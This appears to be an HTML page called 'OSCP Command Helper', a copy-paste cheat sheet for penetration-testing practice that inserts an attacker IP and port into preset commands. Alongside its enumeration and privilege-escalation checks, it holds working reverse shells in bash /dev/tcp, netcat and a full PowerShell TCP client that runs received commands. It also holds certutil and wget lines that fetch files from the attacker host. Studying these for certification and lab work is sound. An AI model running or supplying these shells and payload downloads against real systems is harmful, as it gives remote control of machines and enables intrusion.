<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>OSCP Command Helper</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #1e1e1e;
      color: #f0f0f0;
      padding: 20px;
    }
    h1 {
      text-align: center;
      color: #4caf50;
    }
    select, button, input {
      margin: 5px;
      padding: 8px;
    }
    .command-box {
      background: #2e2e2e;
      padding: 10px;
      margin: 10px 0;
      border-left: 4px solid #4caf50;
      position: relative;
    }
    .copy-btn {
      position: absolute;
      top: 10px;
      right: 10px;
      background-color: #4caf50;
      color: white;
      border: none;
      padding: 4px 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>

<h1>OSCP Command Helper</h1>

<label for="category">Choose Category:</label>
<select id="category" onchange="loadCommands()">
  <option value="enum">Enumeration</option>
  <option value="privesc">Privilege Escalation</option>
  <option value="rev">Reverse Shells</option>
  <option value="file">File Transfer</option>
</select>

<input type="text" id="ip" placeholder="Attacker IP (e.g. 10.10.14.1)">
<input type="text" id="port" placeholder="Port (e.g. 4444)">

<div id="commands"></div>

<script>
  const commands = {
    enum: [
      { os: "Linux", cmd: "uname -a" },
      { os: "Linux", cmd: "id; whoami; hostname" },
      { os: "Windows", cmd: "systeminfo" },
      { os: "Windows", cmd: "net user" }
    ],
    privesc: [
      { os: "Linux", cmd: "find / -perm -u=s -type f 2>/dev/null" },
      { os: "Linux", cmd: "sudo -l" },
      { os: "Windows", cmd: "whoami /priv" },
      { os: "Windows", cmd: "wmic qfe get Caption,Description,HotFixID,InstalledOn" }
    ],
    rev: [
      { os: "Linux", cmd: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1" },
      { os: "Linux", cmd: "nc -e /bin/bash {IP} {PORT}" },
      { os: "Windows", cmd: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" }
    ],
    file: [
      { os: "Linux", cmd: "python3 -m http.server 8000" },
      { os: "Linux", cmd: "scp file.txt user@{IP}:/tmp/" },
      { os: "Windows", cmd: "certutil -urlcache -split -f http://{IP}:{PORT}/file.exe file.exe" },
      { os: "Linux", cmd: "wget http://{IP}:{PORT}/file.sh -O /tmp/file.sh" }
    ]
  };

  function loadCommands() {
    const cat = document.getElementById("category").value;
    const ip = document.getElementById("ip").value || "{IP}";
    const port = document.getElementById("port").value || "{PORT}";
    const cmdDiv = document.getElementById("commands");
    cmdDiv.innerHTML = "";

    commands[cat].forEach(c => {
      let replaced = c.cmd.replaceAll("{IP}", ip).replaceAll("{PORT}", port);
      let html = `
        <div class="command-box">
          <strong>${c.os}:</strong>
          <pre>${replaced}</pre>
          <button class="copy-btn" onclick="copyToClipboard(\`${replaced}\`)">Copy</button>
        </div>
      `;
      cmdDiv.innerHTML += html;
    });
  }

  function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
      alert("Copied to clipboard!");
    });
  }

  window.onload = loadCommands;
</script>

</body>
</html>
